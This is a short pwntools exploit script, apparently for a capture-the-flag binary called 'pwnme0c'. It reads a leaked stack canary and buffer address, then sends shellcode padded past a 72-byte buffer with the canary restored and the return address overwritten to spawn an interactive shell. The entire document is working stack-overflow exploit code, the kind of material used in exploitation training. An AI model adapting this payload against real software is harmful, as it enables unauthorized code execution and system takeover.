from pwn import *

context.arch = 'amd64'
p = process('./pwnme0c')

p.recvuntil(b'is: ')
canary = int(p.recvline().strip(), 16)
log.info(f"Canary: {hex(canary)}")

p.recvuntil(b'is ')
buf_addr = int(p.recvline().strip(), 16, )
log.info(f"Buffer: {hex(buf_addr)}")

shellcode = asm(shellcraft.sh())

payload  = shellcode
payload += b'A' * (72 - len(shellcode))
payload += p64(canary)
payload += b'B' * 8
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
